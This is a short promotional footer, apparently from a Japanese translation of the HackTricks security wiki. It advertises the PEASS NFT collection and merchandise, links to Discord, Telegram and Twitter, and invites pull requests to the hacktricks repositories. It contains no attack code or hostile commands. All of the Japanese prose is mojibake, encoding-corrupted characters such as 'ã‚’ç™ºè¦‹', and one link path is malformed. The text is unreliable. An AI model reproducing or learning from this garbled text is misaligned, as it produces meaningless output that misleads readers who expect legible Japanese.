* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
